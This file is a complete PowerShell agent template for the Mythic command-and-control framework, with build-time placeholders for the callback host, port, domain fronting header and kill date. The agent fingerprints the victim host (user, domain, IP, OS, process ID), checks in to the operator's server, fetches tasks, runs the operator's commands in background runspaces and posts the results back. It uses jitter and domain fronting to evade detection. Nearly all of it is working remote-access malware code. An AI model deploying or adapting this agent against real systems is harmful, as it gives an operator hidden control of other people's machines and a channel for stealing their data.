# Create agent object to track configuration
$Agent = [pscustomobject]@{
    Server = "callback_host"
    Port = "callback_port"
    URI = "/post_uri"
    PayloadUUID = "UUID_HERE"
    UUID = ""
    UserAgent = "USER_AGENT"
    HostHeader = "domain_front"
    Sleep = callback_interval
    Jitter = callback_jitter
    KillDate = "killdate"
    Script = ""
}

# Add after Agent Config
[hashtable]$Script:Commands = @{}
[hashtable]$Script:Management_Commands = @{}
$Script:Jobs = New-Object System.Collections.ArrayList

###
# Command Functions
###
COMMANDS_HERE

###
# Utility functions
###

# get process architecture
function Get-Arch {
    if([IntPtr]::Size -eq 8) {
        return "x64"
    }
    else {
        return "x86"
    }
}

# check if agent is running past kill date
function Check-KillDate {
    try {
        $kill = [DateTime]::Parse($Agent.KillDate)
        $date = [DateTime]::Today
        if ([DateTime]::Compare($kill, $date) -ge 0) {
            return $false
        }
        else {
            return $true
        }
    }
    catch {

    }
}

# get sleep time with jitter
function Get-SleepTime {
    if ($Agent.Jitter -eq 0) {
        return $Agent.Sleep * 1000
    }
    else {
        $high = $Agent.Sleep + ($Agent.Sleep * ($Agent.Jitter * 0.01))
        $low = $Agent.Sleep - ($Agent.Sleep * ($Agent.Jitter * 0.01))
        $rand = [System.Random]::New()
        $sleep = $rand.Next($low, $high)
        return $sleep * 1000
    }
}

###
# Web request functions
###

# send data to Mythic server with POST request
function Post-Request {
    param([string] $data)

    # Create WebClient object
    $wc = [System.Net.WebClient]::New()

    # Add our request headers
    $wc.Headers.Add("User-Agent", $Agent.UserAgent)
    if ($Agent.HostHeader -ne "") {
        $wc.Headers.Add("Host", $Agent.HostHeader)
    }

    # Attempt to send data to Mythic, if it fails or the data is not a tasking message just return nothing
    try {
        $result = $wc.UploadString($Agent.server + $Agent.URI, $data)
        return $result
    }
    catch {
        return ""
    }
}

###
# HTTP profile functions
###

# collect checkin data, send data to Mythic server, and process results
function Send-Checkin {
    # Gather checkin data into custom PowerShell object and convert to JSON
    $reg = Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion'
    $data = [pscustomobject]@{
        action = "checkin"
        ip = (Test-Connection -ComputerName $env:computername -Count 1).IPV4Address.IPAddressToString
        os = "$($reg.Productname) $($reg.ReleaseId)"
        user = $env:username
        host = $env:computername
        domain = $env:userdomainname
        pid = [System.Diagnostics.Process]::GetCurrentProcess().Id
        uuid = $Agent.PayloadUUID
        architecture = Get-Arch
    } | ConvertTo-Json

    # Base64 checkin message
    $encoded_data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$($Agent.PayloadUUID)$($data)"))

    # Send checkin data to Mythic server
    $response = Post-Request -data $encoded_data

    # Decode response data
    $decoded_data = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response)).substring(36)

    # Check if Mythic returned data, update UUID and tell Main loop to continue
    $result = $decoded_data | ConvertFrom-Json

    if ($result.status -eq "success") {
        $Agent.UUID = $result.Id
        return $true
    }
    else {
        return $false
    }
}

function Get-Tasking {
    # Create message to receive tasking from Mythic
    $data = [pscustomobject]@{
        action = "get_tasking"
        tasking_size = -1
    } | ConvertTo-Json

    # Base64 checkin data
    $encoded_data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Agent.UUID+$data))

    # Send checkin data to Mythic server
    $response = Post-Request -data $encoded_data

    # Decode response data
    $decoded_data = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response)).substring(36)

    # create task object and return if tasking was received
    try {
        $mythic_data = $decoded_data | ConvertFrom-Json
        ForEach ($task in $mythic_data.tasks) {
            $tasking = [pscustomobject]@{
                task_id = $task.id
                command = $task.command
                parameters = $task.parameters
                result = ""
                completed = $false
                started = $false
                error = $false
                pshost = [powershell]::Create()
                runspace = [runspacefactory]::CreateRunspace()
                job_object = $null
            }
            $Script:Jobs.Add($tasking) | Out-Null
        }
    }
    catch {
        continue
    }
}

function Post-Response {
    # Create message to send responses back to Mythic
    $responses = @()
    ForEach ($job in $Script:Jobs) {
        if ($job.completed) {
            if (!$job.error) {
                try{
                    $task_resp = $job.result | ConvertFrom-Json
                    Add-Member -InputObject $task_resp -Name "task_id" -MemberType NoteProperty -value $job.task_id
                    $response = $task_resp

                }catch{
                    $response = [pscustomobject]@{
                        task_id = $job.task_id
                        user_output = $job.result | Out-String
                        completed = "true"
                    }
                }
            }
            else {
                try{
                    $task_resp = $job.result | ConvertFrom-Json
                    Add-Member -InputObject $task_resp -Name "task_id" -MemberType NoteProperty -value $job.task_id
                    $response = $task_resp
                }catch{
                    $response = [pscustomobject]@{
                        task_id = $job.task_id
                        user_output = $job.result | Out-String
                        status = "error"
                        completed = "true"
                    }
                }

            }
            $responses += $response
        }
    }

    # If no responses are available, return
    if ($responses.Count -eq 0) {
        return $false
    }
    # create final JSON message
    $data = [pscustomobject]@{
        action = "post_response"
        responses = @($response)
    } | ConvertTo-Json -Depth 5 -Compress
    # Base64 checkin data
    $encoded_data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Agent.UUID+$data))

    # send responses back to Mythic server
    $response = Post-Request -data $encoded_data

    # Decode response data
    $decoded_data = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response)).substring(36)

    # TODO: process response messages
    try {
        $mythic_message = $decoded_data | ConvertFrom-Json
        $jobs = $Script:Jobs
        ForEach ($job in $jobs) {
            ForEach ($response in $mythic_message.responses) {
                if ($response.task_id -eq $job.task_id) {
                    if ($response.status -eq "success") {
                        $Script:Jobs.Remove($job)
                    }
                }
            }
        }
    }
    catch {
        continue
    }
}


function Execute-Command {
    param($task)

    try {
        # setup Runspace
        $task.pshost.runspace = $task.runspace
        $task.runspace.Open()

        # Add any cached script to command
        $command = ""
        if (![string]::IsNullOrEmpty($Agent.Script)) {
            $command = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Agent.Script)) + ";"
        }

        # Add tasking command function and arguments to pipeline
        $command += $Script:Commands.($task.command).ToString() + "; Start-Function -Arguments '" + $task.parameters + "'| Out-String"
        [void]$task.pshost.AddScript($command)

        # Begin async job
        $task.job_object = $task.pshost.BeginInvoke()

        # Mark task as started
        $task.started = $true
    }

    catch {
        $_.Exception.Message
        $task.started = $true
        $task.completed = $true
        $task.error = $true
        $task.result = "Command could not be executed"
    }
}

function Retrieve-Output {
    ForEach ($job in $Script:Jobs) {
        # Check if job is already completed
        if (!$job.completed) {
            # Check if async task is complete
            if ($job.job_object.IsCompleted) {
                # Save task result
                $job.result = $job.pshost.EndInvoke($job.job_object)
                # Cleanup PowerShell isntance
                $job.pshost.Dispose()
                # Mark job as complete
                $job.completed = $true
            }
        }
    }
}

function Process-Taskings {
    ForEach ($job in $Script:Jobs) {
        if (!$job.started) {
            if ($Script:Management_Commands.contains($job.command)){
                try{
                    $res = &$Script:Management_Commands[$job.command] -Job $job
                    $job.result = $res
                    $job.completed = $true
                }catch{
                    $job.error = $true
                    $job.completed = $true
                    $job.result = $_
                }

            }else{
                Execute-Command -task $job | Out-Null
            }
        }
    }
}

#### Main loop
# Main agent tasking loop
while ($true) {
    if ($Agent.UUID -eq "") {
        Send-Checkin | Out-Null
        $sleep = Get-SleepTime
        [System.Threading.Thread]::Sleep($sleep)
    }
    else {
        while ($true) {
            if (Check-KillDate) {
                exit
            }
            Get-Tasking | Out-Null
            Process-Taskings | Out-Null
            Retrieve-Output | Out-Null
            Post-Response | Out-Null
            $sleep = Get-SleepTime
            [System.Threading.Thread]::Sleep($sleep)
        }
    }
}
